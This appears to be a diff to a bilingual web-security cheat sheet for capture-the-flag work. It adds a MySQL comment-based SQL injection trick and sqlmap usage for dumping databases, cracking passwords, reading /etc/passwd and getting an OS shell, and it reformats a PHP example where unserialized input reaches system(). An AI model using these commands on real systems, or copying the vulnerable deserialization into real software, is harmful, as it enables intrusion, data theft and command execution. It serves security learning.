@@ -302,6 +302,8 @@ cat $(ls)
     - `--`
     - `/**/`
     - `/*! 50001 select * from test */`
+        - 可探測版本
+        - e.g. `SELECT /*!32302 1/0, */ 1 FROM tablename`
     - `
         - MySQL <= 5.5
     - `;`
@@ -613,6 +615,33 @@ HQL injection example (pwn2win 2017)
     - ASP + IIS: `id=1,2,3`
     - PHP + Apache: `id=3`
 
+## SQLmap
+
+- https://github.com/sqlmapproject/sqlmap/wiki/Usage
+- Usage
+    - `python sqlmap.py -u 'test.kaibro.tw/a.php?id=1'`
+        - 庫名: `--dbs`
+        - 表名: `-D dbname --tables`
+        - column: `-D dbname -T tbname --columns`
+        - dump: `-D dbname -T tbname --dump`
+            - `--start=1`
+            - `--stop=5566`
+        - DBA? `--is-dba`
+        - 爆帳密: `--passwords`
+        - 看權限: `--privileges`
+        - 拿shell: `--os-shell`
+        - interative SQL: `--sql-shell`
+        - 讀檔: `--file-read=/etc/passwd`
+        - Delay時間: `--time-sec=10`
+        - User-Agent: `--random-agent`
+        - Thread: `--threads=10`
+        - Level: `--level=3`
+            - default: 1
+        - `--technique`
+            - default: `BEUSTQ`
+        - Cookie: `--cookie="abc=55667788"`
+                                                                                 
+
 
 # LFI
 
@@ -749,9 +778,7 @@ HQL injection example (pwn2win 2017)
 
 - Public / Private / Protected 序列化
 
-    - 例如：class名字為: `Kaibro`
-
-    - 變數名字: `test`
+    - 例如：class名字為: `Kaibro`，變數名字: `test`
 
     - 若為Public，序列化後：
         - `...{s:4:"test";...}`
@@ -788,18 +815,18 @@ HQL injection example (pwn2win 2017)
 - Example 2 - Private
 
 ```php
-<?php
+    <?php
 
-class Kaibro {
-    private $test = "ggininder";
-    function __wakeup()
-    {
-        system("echo ".$this->test);
+    class Kaibro {
+        private $test = "ggininder";
+        function __wakeup()
+        {
+            system("echo ".$this->test);
+        }
     }
-}
 
-$input = $_GET['str'];
-$kb = unserialize($input);
+    $input = $_GET['str'];
+    $kb = unserialize($input);
 
 ```
 
